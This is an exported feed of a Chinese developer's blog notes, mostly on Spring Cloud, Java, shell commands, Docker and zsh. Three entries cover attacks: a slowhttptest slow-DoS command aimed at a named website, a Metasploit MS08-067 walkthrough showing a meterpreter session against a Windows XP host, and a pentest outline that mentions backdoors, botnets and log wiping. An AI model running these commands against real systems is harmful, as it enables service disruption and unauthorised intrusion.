    <url>%2F2018%2F03%2F24%2Fservice-permission%2Foauth-oauth2%2F</url>
    <content type="text"><![CDATA[翻了几篇子 认证 csdn 一个模样 连错误都一样 《用访问令牌到授权服务器换取访问令牌(accesstoken&amp;secret)》这叫人怎么理解 ？？ 果断找官网https://oauth.net/core/1.0a/ https://oauth.net/2/ 1234567891011121314151617181920212223242526OAuth2 授权类型1、运行在网络服务器，基于浏览器和移动应用程序的应用程序的授权码【web授权】2、密码为与登录用户名和密码3、客户端凭证的应用程序访问4、Implicit以前曾被推荐给没有秘密的客户，但已被使用授权代码授权而没有秘密取代。OAuth认证和授权的过程如下:1、用户访问第三方网站网站，想对用户存放在服务商的某些资源进行操作。2、第三方网站向服务商请求一个临时令牌。3、服务商验证第三方网站的身份后，授予一个临时令牌。4、第三方网站获得临时令牌后，将用户导向至服务商的授权页面请求用户授权，然后这个过程中将临时令牌和第三方网站的返回地址发送给服务商。5、用户在服务商的授权页面上输入自己的用户名和密码，授权第三方网站访问所相应的资源。6、授权成功后，服务商将用户导向第三方网站的返回地址。7、第三方网站根据临时令牌从服务商那里获取访问令牌。8、服务商根据令牌和用户的授权情况授予第三方网站访问令牌。9、第三方网站使用获取到的访问令牌访问存放在服务商的对应的用户资源。 国外文档：https://aaronparecki.com/oauth-2-simplified/ 看不懂的用有道翻译啊[捂脸笑][捂脸笑][捂脸笑] 巨详细的请求解释 看看国内的 mmp]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fcrontab%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223/crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置&lt;/pre&gt;service crond statusservice crond start查看crontab服务是否已设置为开机启动，执行命令：ntsysv加入开机自动启动：chkconfig -level 35 crond on定制脚本crontab -e 相当于vim文档加入0 1 * * * root /data/bakdb.sh &gt; /data/bak.log 2&gt;&amp;1*/2 * * * * /bin/bash -x /shell/web_monit/http_monit.sh &gt; /dev/null 2&gt;&amp;1查看定时任务crontab -u root -l]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java后台常用命令]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fshell-1%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526cdpsps -efps -ef | grep &quot;&quot;| 管道符#移动文件mv /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db#复制文件cp /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db.backup#复制文件夹cp -a /usr/bin/ /var/data/mysql/ mkdir New_Dir mkdir -p New_Dir/Sub_Dir/Under_Dir sh .../*.shvim 123.txttail -f ../*.log tail -f -n1000 ../*.log]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java后台升级命令]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fshell-2%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839topnetstatnetstat -ano | grep 8080killkill -9#读写执行 all userchmod 777 123.txt#当前用户执行权限chmod +x git_pull.shchown root:root 123.txtsudo apt-get installsudo apt-get removesudo yum installsudo yum removesudo yum -y installsudo -s -Hsu rootunzip -d 123.ziptouch readme.txtcat readme.txtmore readme.txtless readme.txtsort readme.txtdu -h 1234567891011121314151617181920212223242526cat /proc/versionawkif..elsesleepmanlsof -i:8080useradd -r nexus# 打印关键字行grep -n &quot;业务有关的关键字&quot; 2018-06-26.log #文件切割 开始2行、结束6行sed -n &apos;2,6p&apos; access.log &gt; new-access.log#统计文件内容出现次数grep -o &quot;message&quot; nohup.out | wc -l#scp远程拷贝scp -r /usr/local/mongodb-3.6.5/ root@10.44.33.22:/opt/software/]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[install docker]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Finstall-docker%2F</url>
    <content type="text"><![CDATA[国内大佬专玩docker地址中文翻译http://www.widuu.com/docker/ 123456789101112从官方下载curl https://get.docker.com &gt; /tmp/install.shsh install.sh从系统镜像元下载centos：yum install dockerdebian: apt-get install docker在centos-6 中 docker 与系统自带可执行程序冲突。执行：yum -y remove dockeryum install docker-io 123456789101112131415启动dockerservice docker start设定默认开机启动chkconfig docker on下载镜像并运行docker pull centos查看镜像docker images centos运行镜像docker run -i -t centos /bin/bash]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[what is the docker]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Fwhat-docker%2F</url>
    <content type="text"><![CDATA[what is docker? 百度 告诉我们docker是一个容器 作为java码头搬砖的 我想到了 spring也是叫做容器 那么容器是一个什么样的概念? 不由想到了水缸—容器 容器装载水的 与水毫无关系 spring容器 IOC AOP 都晓得IOC 把对象创建交给spring管理 然后加载到jvm中运行java 程序AOP 面向切面编程.其实就是提供了一个切面模式.能够很好地控制类的加载顺序.或者类的执行顺序 但是本质上spring容器就是装载java程序的 那么docker?装载各种程序的.暂时可以理解为一个系统.系统也是一个容器.装载我们运行的程序window装载 exe. linux装载rpm. android 装载一类apk的程序 ios装载一类ipa的程序 那么官网是怎么吹皮的呢?Docker是推动集装箱运动的公司，也是唯一一家能够解决混合云中的每个应用的集装箱平台提供商。当今的企业面临数字化转型的压力，但受到现有应用程序和基础架构的制约，同时合理化日益多样化的云，数据中心和应用程序体系结构。Docker实现了应用程序和基础架构与开发人员和IT运营商之间的真正独立性，从而发挥其潜力，并创建更好的协作和创新模式。 docker给我们提供了什么样的先进功能? 也是我们要用它的原因 1.敏捷 通过13X加速软件开发和部署，并立即响应客户的需求。2.可移植性一劳永逸地消除“在我的机器上工作”。在本地和云环境中获得独立性。3.安全通过内置的安全功能和配置，在整个生命周期中提供更安全的应用程序。4.节约成本优化基础架构资源的使用并简化操作，以节省总成本的50％。 在使用上: 1.简单Docker为应用创建和编排提供了强大的工具2.透明度采用开源技术和模块化设计构建，可轻松集成到现有环境中。3.独立Docker在开发人员和IT部门之间以及应用程序和基础架构之间创建了一个关注点，以解锁创新 在行业上1.现代化传统应用[MTA]Docker的第一步是现有的应用程序组合。将现有应用程序打包到容器中可以立即提高安全性，降低成本并获得云的便携性。这种转换将现代属性应用于遗留应用程序 - 所有这些都不需要更改一行代码。 2.混合云云迁移，多云或混合云基础架构需要应用程序的无缝移植。Docker将应用程序及其依赖关系打包到一个独立的容器中，使它们可以移植到任何基础架构中 一劳永逸地消除“在我的机器上工作”的问题。Docker认证的基础架构确保集装箱化的应用程序一直工作。 3.持续集成和部署[DEVOPS]集成现代方法并通过集成Docker和DevOps来自动化开发流程。通过消除应用程序冲突并提高开发人员的生产力，容器的独立性使其有助于快速变化的环境。Docker实现了关注的真正分离，加速了DevOps流程的采用。 4.微服务Docker容器在设计上是轻量级的，是实现微服务应用程序开发的理想选择。加速作为单个应用程序组成的数十个或数百个容器的开发，部署和回滚。无论是构建新的微服务还是将小块服务转换为更小的服务，简单易用的工具都可以轻松组合，部署和维护复杂的应用程序。 docker安装:https://docs.docker.com/engine/installation/ docker与虚拟机区别 可看出虚拟机拥有较强的隔离技术。虚拟机承载的镜像都是互相独立的。而且虚拟机中执行的进程是被虚拟机管理的，并不与主机进程等价。 docker容器技术中，最主要一点就是容器进程与主机进程等价。省去了虚拟机进程管理的消耗。但是这样也带来了问题。容器隔离度安全问题。 另外docker中可以两个应用共用一个库。而虚拟机因为隔离性太强，只能各用个的。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zsh]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fzsh%2F</url>
    <content type="text"><![CDATA[zsh 安装:zsh 又名终极shell出名于 oh my zsh 可配置主题还有很多插件 功能在此用作文件默认开启程序 和 alias使用也是极大方便123centos:yum install zshdebian:apt-get install zsh oh-my-zsh 安装: 1234567# via curlcurl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh# via wgetwget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh 设置zsh为系统默认shell: 123456789# 为root用户修改默认shell为zshchsh -s /bin/zsh root# 为当前用户修改默认shell为zshchsh -s /bin/zsh# orchsh -s `which zsh`# 恢复命令chsh -s /bin/bash add to ~/.zshrc:12345678export PATH=$PATH:/usr/local/go/bin#export PATH=$PATH:/Applications/MAMP/bin/php/php5.6.10/bin:/Users/GZM/composer:/Users/GZM/.composer/vendor/bin#export GOPATH=/Users/GZM/work/go#export GOPATH=/Volumes/Transcend/git/360/private_cloud_server_code/tools/gowork/#export GOBIN=$GOPATH/bin#export GO15VENDOREXPERIMENT=1LC_CTYPE=en_US.UTF-8LC_ALL=en_US.UTF-8 升级: 1upgrade_oh_my_zsh vim /etc/zsh/zshrc 123456789101112131415161718alias cls=&apos;clear&apos;alias ll=&apos;ls -l&apos;alias l=&apos;ls -l&apos;alias la=&apos;ls -a&apos;alias vi=&apos;vim&apos;alias rm=&apos;rm -rf&apos;alias javac=&quot;javac -J-Dfile.encoding=utf8&quot;alias -s html=mate # 在命令行直接输入后缀为 html 的文件名，会在 TextMate 中打开alias -s rb=mate # 在命令行直接输入 ruby 文件，会在 TextMate 中打开alias -s py=vi # 在命令行直接输入 python 文件，会用 vim 中打开，以下类似alias -s js=vialias -s c=vialias -s java=vialias -s txt=vialias -s gz=&apos;tar -xzvf&apos;alias -s tgz=&apos;tar -xzvf&apos;alias -s zip=&apos;unzip&apos;alias -s bz2=&apos;tar -xjvf&apos;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-定时任务]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspring-crontab%2F</url>
    <content type="text"><![CDATA[@scheduled注解执行表123456789101112131415161718190 0 10,14,16 * * ? 每天上午10点，下午2点，4点0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时0 0 12 ? * WED 表示每个星期三中午12点&quot;0 0 12 * * ?&quot; 每天中午12点触发&quot;0 15 10 ? * *&quot; 每天上午10:15触发&quot;0 15 10 * * ?&quot; 每天上午10:15触发&quot;0 15 10 * * ? *&quot; 每天上午10:15触发&quot;0 15 10 * * ? 2005&quot; 2005年的每天上午10:15触发&quot;0 * 14 * * ?&quot; 在每天下午2点到下午2:59期间的每1分钟触发&quot;0 0/5 14 * * ?&quot; 在每天下午2点到下午2:55期间的每5分钟触发&quot;0 0/5 14,18 * * ?&quot; 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发&quot;0 0-5 14 * * ?&quot; 在每天下午2点到下午2:05期间的每1分钟触发&quot;0 10,44 14 ? 3 WED&quot; 每年三月的星期三的下午2:10和2:44触发&quot;0 15 10 ? * MON-FRI&quot; 周一至周五的上午10:15触发&quot;0 15 10 15 * ?&quot; 每月15日上午10:15触发&quot;0 15 10 L * ?&quot; 每月最后一日的上午10:15触发&quot;0 15 10 ? * 6L&quot; 每月的最后一个星期五上午10:15触发&quot;0 15 10 ? * 6L 2002-2005&quot; 2002年至2005年的每月的最后一个星期五上午10:15触发&quot;0 15 10 ? * 6#3&quot; 每月的第三个星期五上午10:15触发]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspring%2F</url>
    <content type="text"><![CDATA[特性:IOC AOP 控制反转．面向切面编程 由spring创建obj. 独特的obj注入方式 执行过程切面管理 bean加载方式 spring cglib代理织入切面方法执行]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sringmvc]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspringmvc%2F</url>
    <content type="text"><![CDATA[启动加载顺序 spring加载流程123451.监听器加载spring2.加载配置文件3.工厂生产实例化对象4.放入ServletContext springmvc加载流程123451.Servlet加载（监听器之后即执行）Servlet的init()2.加载配置文件3.从ServletContext拿到spring初始化springmvc相关对象4.放入ServletContext springmvc执行流程 1234561.用户请求到DispatcherServlet2.DispatcherServlet查找HandlerMapping请求Handler并返回查找结果3.DispatcherServlet调用HandlerAdapter执行Handler并返回执行结果4.DispatcherServlet调用ResolverView生成视图并返回视图5.DispatcherServlet返回给用户]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot mybatis 配置]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fspring-boot-1%2F</url>
    <content type="text"><![CDATA[application.java 类上注解 遇到的问题 Factory method ‘sqlSessionFactory’ threw exception; nested exception is java.io.FileNotFoundException: Could not open ServletContext resource [/false] 如果没有本地配置mybatis-config.xml的话 不要加这个配置]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于漏洞和攻击]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fabout-hack%2F</url>
    <content type="text"><![CDATA[看过一篇子电影 《没有绝对安全的系统》 首先黑客是怎么攻击一个系统的呢？一个系统又是怎么在黑客攻击下崩溃的？ 我的猜想：1、任何系统都是有代码组成、这些系统都是为人服务，需要人为输入数据进行分析、重点来了 那么这些数据有些就是正常数据、有些则可能是恶意数据、没有任何一个系统是不需要数据输入的、即便都是定制化属性有用户来进行选择、那么我们可以仿造代码进行替换、【语言这个东西又不是只有你一个人会】、2、然后通过发送请求、测试请求信息、伪造一个请求信息、写成脚本3、将请求脚本【也就是攻击脚本分发各个肉鸡】、由肉鸡进行攻击 使用肉鸡的原因有几个1、安全、不暴露攻击者本机ip【攻击时候作死：ping服务器不算】2、数量可控、可针对不同系统吞吐量 控制不同数量的肉鸡进行攻击 那么什么是恶意数据？黑客们精心编制的一组数据、与业务代码中代码进行耦合、以早成运行器崩溃、虚拟机泄漏等等。或者早成无限循环等等]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hystrix]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2FHystrix%2F</url>
    <content type="text"><![CDATA[原理 1、流程图123456789101、方法标注 @HystrixCommand注解2、方法执行进入执行队列、方法执行、【图中标注 .toObservable()状态】3、缓存是否可见【有 返回缓存数据；没有进入下一步判断】4、断路器是否打开【未打开 直接判断信号量线程池是否拒绝 ；打开且触发断路进去fallback方法】5、信号量线程池是否拒绝【未拒绝 创建线程池隔离舱执行业务逻辑 ；拒绝 执行fallback方法】6、业务逻辑执行是否成功【成功 判断是否超时；未成功 执行fallback方法】7、判断是否超时【超时 不返回 未超时返回数据】8、fallback执行结果【成功 返回数据 ；失败 返回失败或者自行实现业务方法】其中方法执行结果要返回断路器健康状态给断路器【也就是图中绿色4】 具体信息可见官方详细： https://github.com/Netflix/Hystrix/wiki/How-it-Works]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[版本问题]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fversion-config%2F</url>
    <content type="text"><![CDATA[springboot 1.x server.context-path=/demo springboot 2.x server.servlet.context-path=/demo不兼容了许多组建:sleuth. 1.5的springboot 对各大开源组件兼容的版本比较低 比如es、 因项目中使用es。5.X、spring-boot1.5兼容到4.X版本 而springboot对es5.x的兼容是spring-boot2.0版本、干的项目里前后不能相顾、很尴尬。。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DOS攻击工具]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fdos%2F</url>
    <content type="text"><![CDATA[1.slowhttptest慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的 123456789101112131415161718192021222324252627282930313233bt5 r3安装过程是这样的,你先移动到根目录 运行命令：wget http://slowhttptest.googlecode.com/files/slowhttptest-1.5.tar.gz 第一条：下载tar -vxf slowhttptest-1.5.tar.gz 解压cd slowhttptest-1.5/ 进入目录./configure 再往下你懂的makemake install测试白帽攻击是这样的：slowhttptest -c 1000 -X -g -o -slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://www.loveuv.net -p 3参数：—a —开始开始值范围说明符用于范围头测试-b 将字节限制的范围说明符用于范围头测试- c 的连接数限制为65539- d proxy host:port 用于指导所有流量通过web代理- e proxy host:port 端口用于指导只有探针交通通过web代理- h,B,R或x 指定减缓在头部分或在消息体,- R 允许范围检验,使慢读测试- x- g 生成统计数据在CSV和HTML格式,模式是缓慢的xxx。csv / html,其中xxx是时间和日期- i seconds 秒间隔跟踪数据在几秒钟内,每个连接- k 管道因子次数重复请求在同一连接慢读测试如果服务器支持HTTP管道内衬。- l 在几秒钟内，秒测试时间- n 秒间隔从接收缓冲区读取操作- o 文件定义输出文件路径和/或名称,如果指定有效- g- p 秒超时等待HTTP响应在探头连接后,服务器被认为是不可访问的- r seconds 连接速度- s 字节值的内容长度标题详细说明,如果指定- b- t verb 自定义- u URL 目标URL,相同的格式键入浏览器,e。g https://host[:port]/- v level 冗长等级0 - 4的日志- w 字节范围广告的窗口大小会选择从- x 字节最大长度的跟踪数据结束- y 字节范围广告的窗口大小会选择从- z 字节从接收缓冲区读取字节与单一的read()操作 也可以查看 man slowhttptest]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EUREKA服务治理]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Feureka-1%2F</url>
    <content type="text"><![CDATA[1、服务治理三个核心点、服务提供者、服务消费者、服务注册中心 结合Ribbon 服务治理图 服务治理时序图 服务提供者功能： 1、服务注册2、服务同步3、服务续约4、..12345678910111213141516171819服务注册：服务提供者在启动时候通过rest请求 、将自己注册到Eureka Server上、同时携带自身服务的一些元数据信息、Eureka Server接收到这个rest请求后 将这些元数据存储到一个双层结构Map中、其中第一层map 的key是服务名字、第二层key是具体服务实例名、相关配置：eureka.client.register-with-eureka=true 【默认 true】服务同步：情景：两个相同的服务提供者实例、注册到了不同的服务注册中心、那么由于两个服务注册中心互相注册、服务注册中心会将服务注册信息发送给Eureka-server的其他机器、【还有一种说法是eureka-server 有信息服务功能、server与server之间 有消息同步、不确定这两种说法那个是真是的底层机制、后者是官方的说法、前者是 翟永超书里的说法、也就是说服务同步是由Eureka-server来完成的】服务续约：服务注册后、会维持一个心跳来维持服务不被剔除相关配置：eureka: instance: status-page-url-path: /info //服务信息 health-check-url-path: /health //服务健康状态 lease-expiration-duration-in-seconds: 90 //服务失效时间 lease-renewal-interval-in-seconds: 30 //服务续约持续调用时间 服务消费者功能： 1、获取服务2、服务调用3、服务下线4、..1234567891011121314获取服务：服务消费者会发送一个rest请求获取一个服务列表、Eureka-server会发给client一个只读的服务列表、且该列表会30s刷新一次相关配置：eureka: client: fetch-registry: true //默认为true 设为false则无法获取服务 registry-fetch-interval-seconds: 30 //服务清单刷新时间服务调用：集成Ribbon后、默认会使用轮询机制来调取服务实例信息对于实例选择、在eureka中会有Region和Zone概念一个Region会有很多Zone、每个服务都需要被注册到一个Zone中、所以每个client对应一个Region和一个Zone、服务调用时候会优先访问Zone下列表、没有在访问同一个Region不同Zone下的服务、服务下线：当服务实例jinx你给正常的关闭时、client会给server发送一个server、告知 &quot;我要下线了&quot; 服务注册中心功能： 1、失效剔除2、自我保护3、..12345失效剔除：server会每隔一段时间【默认90s】剔除不正常实例【主要是没有续约的】自我保护：如果同一时间段内由于网络原因大量服务都没有续约、server会继续保持服务列表、而不丢弃这个服务清单列表、也就是触发自我保护机制其主要应对是网络忽然中断、大量服务都被剔除导致服务不可访问危险【牺牲了服务高可用性、zookeeper是全部剔除的 zk是服务强高可用性】相关配置：eureka.server.enable-self-preservation=false //可关闭自我保护机制 关于版本升级1.0升级2.0 添加了获取感兴趣服务实例列表功能、毕竟在几千台服务注册中心上、有些服务实例也不是100%用到、节省了client服务实例清单的内存消耗、还优化一些获取服务算法、 以下为官方地址： https://github.com/Netflix/eureka/wiki]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Feign服务调用]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Ffeign-1%2F</url>
    <content type="text"><![CDATA[为了服务之间的服务调用 基于Retrofit, JAXRS-2.0, andWebSocket. 开发的 客户端调用工具 更简单方便的调用服务信息 以下是官方简单介绍以及基本用法示例 github 123456789101112131415161718192021interface Bank &#123; @RequestLine(&quot;POST /account/&#123;id&#125;&quot;) Account getAccountInfo(@Param(&quot;id&quot;) String id);&#125;@RequestMapping(value = &quot;/test/&quot;,method = RequestMethod.GET)RestResponse test(@RequestParam(&quot;test&quot;)Long test);/** * 带参调用方法 * @RequestLine(&quot;POST /uc/login0&quot;) * @Headers(&quot;Content-type: application/json&quot;) * String example0(@RequestParam(&quot;id&quot;) String id); * @RequestLine(&quot;PUT /uc/login1&quot;) * @Headers(&quot;Content-type: application/json&quot;) * String example1(@RequestBody UserVO userVO); * */]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring cloud 总 架构图]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-cloud-1%2F</url>
    <content type="text"><![CDATA[版权所有 转载 请表明出处 相关代码地址 纠正： 12cli 是 结合grovy脚本 工程consul 是服务注册中心 不过可以结合docker做更容易扩散的集群中心 1234567891011121314151617总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新有RPC 框架的 注册 netflix有 关于配置的 远程仓库配置 config有 关于消息 bus stream有关于app的 for android (提供RestTemplate)有关任务调度 的 task有关于 shell 编程有关于安全方面的有关于系统拦截 zuul等等。那么看名字可以分为两种1、Spring * --- spring 为了完善&quot;应用&quot;增加的功能机制 例如 spring security 、spring vault、等等2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&quot;微服务系统&quot;更方便的集成 对各个功能模块进行封装的结果、]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reactor Core]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Freactor-core%2F</url>
    <content type="text"><![CDATA[本文从以下介绍下 Reactor （反应堆）12345首先简单介绍Reactor 是什么东西、其次解决什么问题、领域应用、原理、优点和缺点、 1、简介 2、解决问题 3、领域应用举个比较熟悉的例子 dubbodubbo底层使用了netty线程模型 netty 中使用了reactor模式 那么什么是reactor模式？ Reactor三种模型 Netty线程模型 Netty结构 dubbo中使用的netty 4、Reactor 原理介绍4.1 Reactor模式结构 4.2Reactor模式模块之间的交互 5、 Reactor优点Reactor An Object Behavioral Pattern for Demultiplexing and Dispatching Handles for Synchronous Events解耦、提升复用性、模块化、可移植性、事件驱动、细力度的并发控制等。相比 传统的实现、即线程的切换、同步、数据的移动会引起性能问题。也就是说从性能的角度上，它最大的提升就是减少了性能的使用，即不需要每个Client对应一个线程 关于 减少使用线程使用 对性能提升的影响 可看这篇论文 SEDA: Staged Event-Driven Architecture - An Architecture for Well-Conditioned, Scalable Internet Service 对随着线程的增长带来性能降低做了一个统计： 在这个统计中，每个线程从磁盘中读8KB数据，每个线程读同一个文件，因而数据本身是缓存在操作系统内部的，即减少IO的影响；所有线程是事先分配的，不会有线程启动的影响；所有任务在测试内部产生，因而不会有网络的影响。该统计数据运行环境：Linux 2.2.14，2GB内存，4-way 500MHz Pentium III。从图中可以看出，随着线程的增长，吞吐量在线程数为8个左右的时候开始线性下降，并且到64个以后而迅速下降，其相应事件也在线程达到256个后指数上升。即1+1&lt;2，因为线程切换、同步、数据移动会有性能损失，线程数增加到一定数量时，这种性能影响效果会更加明显。 6.Reactor模式的缺点]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ribbon]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fribbon%2F</url>
    <content type="text"><![CDATA[官方wiki地址：https://github.com/Netflix/ribbon/wiki 功能简介： 1、多重和可插入的负载平衡 2、与eureka服务整合 3、内置故障发现能力 4、云启用 5、与负载均衡器集成客户端 6、Archaius配置驱动客户端工厂 三个子项目： ribbon-core：包括负载均衡器和客户端接口定义、通用负载均衡器实现、客户端与负载均衡器和客户端工厂集成 ribbon-eureka：包含基于Eureka客户端的负载均衡器实现、这是用于服务注册和发现的liberary ribbon-httpclient：包含基于JSR-311的Rest客户端与服务均衡器集成的实现 配置 sample-client.properties1234567891011121314151617181920# Max number of retries on the same server (excluding the first try)sample-client.ribbon.MaxAutoRetries=1# Max number of next servers to retry (excluding the first server)sample-client.ribbon.MaxAutoRetriesNextServer=1# Whether all operations can be retried for this clientsample-client.ribbon.OkToRetryOnAllOperations=true# Interval to refresh the server list from the sourcesample-client.ribbon.ServerListRefreshInterval=2000# Connect timeout used by Apache HttpClientsample-client.ribbon.ConnectTimeout=3000# Read timeout used by Apache HttpClientsample-client.ribbon.ReadTimeout=3000# Initial list of servers, can be changed via Archaius dynamic property at runtimesample-client.ribbon.listOfServers=www.microsoft.com:80,www.yahoo.com:80,www.google.com:80]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring cloud 族谱]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-cloud-2%2F</url>
    <content type="text"><![CDATA[功能简介来自官网整理人：无心 12345678910111213141516总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新有RPC 框架的 注册 netflix有 关于配置的 远程仓库配置 config有 关于消息 bus stream有关于app的 for android (提供RestTemplate)有关任务调度 的 task有关于 shell 编程有关于安全方面的有关于系统拦截 zuul等等。那么看名字可以分为两种1、Spring * --- spring 为了完善&quot;应用&quot;增加的功能机制 例如 spring security 、spring vault、等等2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&quot;微服务系统&quot;更方便的集成 对各个功能模块进行封装的结果、]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透的艺术]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fart-infiltration%2F</url>
    <content type="text"><![CDATA[分类 描述内容 信息收集 收集域名、服务器ip、指纹 漏洞挖掘 组件指纹、应用层 漏洞利用 目的、ddos、 权限提升 提升shell权限 后门 留下下次访问后门 肉鸡 日志清扫 删除系统日志 经验总结 记录攻击漏洞、肉鸡ip 别人总结的 如有侵犯 请私信 哈哈．．．]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Metasploit入侵windows]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fmetasploit-hack-windows%2F</url>
    <content type="text"><![CDATA[使用msfconsole 查看window发布的漏洞 运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了 12345678910111213141516171819202122232425262728# msfconsolemsf &gt; search platform: windows xp sp3msf &gt; search platform: windows 10msf &gt; search platform: androidmsf &gt; info exploit/windows/smb/ms08_067_netapi使用info查看漏洞信息.msf &gt; use exploit/windows/smb/ms08_067_netapi&gt; set payload windows/meterpreter/bind_tcp&gt; set RHOST 192.168.0.108 (设置目标主机IP地址)&gt; exploit设定攻击方式.攻击ip攻击成功:[*] Started bind handler[*] Automatically detecting the target...[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)[*] Attempting to trigger the vulnerability...[*] Sending stage (751104 bytes) to 192.168.0.108[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32meterpreter &gt;失败就尝试其他漏洞]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zuul]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fzuul%2F</url>
